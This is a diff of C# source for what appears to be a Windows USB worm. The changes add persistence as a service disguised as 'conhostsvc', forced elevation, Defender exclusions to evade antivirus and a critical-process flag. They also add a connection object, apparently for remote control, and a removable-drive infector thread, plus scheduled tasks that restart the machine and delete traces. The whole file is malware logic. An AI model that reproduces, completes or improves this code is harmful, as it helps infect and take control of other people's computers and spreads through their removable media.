@@ -1,16 +1,22 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Reflection;
 using System.ServiceProcess;
+using System.Threading;
+using System.Threading.Tasks;
 
 namespace zort
 {
     class Program : ServiceBase
     {
         public const string SERVICE_NAME = "conhostsvc";
-        public const string TASK_NAME = "PookieBearUwU";
+
+        ServerCon conn = new ServerCon();
+        Thread infectorThread = new Thread(() =>
+        {
+            RemovableInfector infector = new RemovableInfector();
+            infector.Start();
+        });
+
         public Program()
         {
             ServiceName = SERVICE_NAME;
@@ -24,25 +30,14 @@ namespace zort
             Unknown
         }
 
-        public static bool IsTaskSet()
-        {
-            using (var taskService = new Microsoft.Win32.TaskScheduler.TaskService())
-            {
-                var task = taskService.FindTask(TASK_NAME);
-                return task != null;
-            }
-        }
-
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
             Program program = new Program();
             if (Environment.UserInteractive)
             {
                 // Run as console application
                 program.OnStart(args);
-                Console.WriteLine("Press any key to stop...");
-                Console.ReadKey();
-                program.OnStop();
+                await Task.Delay(Timeout.Infinite);
             }
             else
             {
@@ -59,6 +54,54 @@ namespace zort
             return ExecutionState.Unknown;
         }
 
+        protected override void OnStart(string[] args)
+        {
+            try
+            {
+                var executionState = GetExecutionState();
+                File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "POOKservice-log.txt"), $"State: {executionState}\n");
+                Console.WriteLine($"Execution state: {executionState}");
+                switch (executionState)
+                {
+                    case ExecutionState.Usb:
+                        UsbRoutine();
+                        break;
+                    case ExecutionState.Pookie:
+                        PookieRoutine();
+                        break;
+                    case ExecutionState.Service:
+                        //create file in desktop
+                        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                        string filePath = Path.Combine(desktopPath, "test.txt");
+                        File.WriteAllText(filePath, "Hello from the service!");
+                        ServiceRoutine();
+                        break;
+                    case ExecutionState.Unknown:
+                        UnknownRoutine();
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "POOKservice-log.txt"), $"Error: {ex}\n");
+                throw;
+            }
+        }
+
+        protected override void OnStop()
+        {
+            var executionState = GetExecutionState();
+            if (executionState == ExecutionState.Service)
+            {
+                conn.Stop();
+                infectorThread.Abort();
+            }
+            else if (executionState == ExecutionState.Pookie)
+            {
+                PookieHelper.PookieMutex.Release();
+            }
+        }
+
         private void UsbRoutine()
         {
             RemovableInfector.OpenFakeFolderIfRunningFromInfectedUsb();
@@ -66,36 +109,18 @@ namespace zort
             {
                 if (!PookieHelper.IsPookieRunning())
                 {
-                    string pookiePath = PookieHelper.GetPookiePath();
-                    Process.Start(pookiePath);
+                    File.Delete(PookieHelper.GetPookiePath());
                 }
-                Exit();
+                else
+                {
+                    Exit();
+                    return;
+                }
             }
-            else
-            {
-                PookieHelper.CreatePookie();
-                string pookiePath = PookieHelper.GetPookiePath();
-                ElevationHelper.ForceElevate(pookiePath);
-                Exit();
-            }
-        }
-
-        protected override void OnStart(string[] args)
-        {
-            var executionState = GetExecutionState();
-            Console.WriteLine($"Execution state: {executionState}");
-            switch (executionState)
-            {
-                case ExecutionState.Usb:
-                    UsbRoutine();
-                    break;
-                case ExecutionState.Pookie:
-                    PookieRoutine();
-                    break;
-                case ExecutionState.Service:
-                    Console.WriteLine("YIPPIE!!");
-                    break;
-            }
+            PookieHelper.CreatePookie();
+            string pookiePath = PookieHelper.GetPookiePath();
+            ElevationHelper.ForceElevate(pookiePath);
+            Exit();
         }
 
         private void PookieRoutine()
@@ -105,9 +130,9 @@ namespace zort
                 Exit();
             }
 
-            bool isAdmin = ElevationHelper.IsElevated();
-            if (isAdmin)
+            if (ElevationHelper.IsElevated())
             {
+                AntiDetection.AddDefenderExclusions();
                 if (ServiceHelper.IsServiceInstalled())
                 {
                     if (!ServiceHelper.IsServiceRunning()) ServiceHelper.StartService();
@@ -116,13 +141,13 @@ namespace zort
                     return;
                 }
 
-                string clonePath = ServiceHelper.CreateItITClone();
+                string clonePath = ServiceHelper.CreateServiceExecutable();
                 ServiceHelper.InstallService(clonePath);
                 PookieHelper.PookieMutex.Release();
 
                 if (PookieHelper.Tasks.StartAtLogon.Exists()) PookieHelper.Tasks.StartAtLogon.Remove();
-                if (PookieHelper.Tasks.DeletePookieAtNextLogon.Exists()) PookieHelper.Tasks.DeletePookieAtNextLogon.Remove();
-                PookieHelper.Tasks.DeletePookieAtNextLogon.Create();
+                if (PookieHelper.Tasks.DeleteAtNextLogon.Exists()) PookieHelper.Tasks.DeleteAtNextLogon.Remove();
+                PookieHelper.Tasks.DeleteAtNextLogon.Create();
                 Util.RestartComputer();
                 Exit();
                 return;
@@ -137,24 +162,22 @@ namespace zort
             }
         }
 
+        private void ServiceRoutine()
+        {
+            NativeMethods.MakeProcessCritical();
+            conn.Start();
+            infectorThread.Start();
+        }
+
+        private void UnknownRoutine()
+        {
+            // Continue action as usb
+            UsbRoutine();
+        }
+
         private void Exit()
         {
             Environment.Exit(0);
-        }
-
-        protected override void OnStop()
-        {
-
-        }
-
-        protected override void OnPause()
-        {
-
-        }
-
-        protected override void OnContinue()
-        {
-
         }
     }
 }
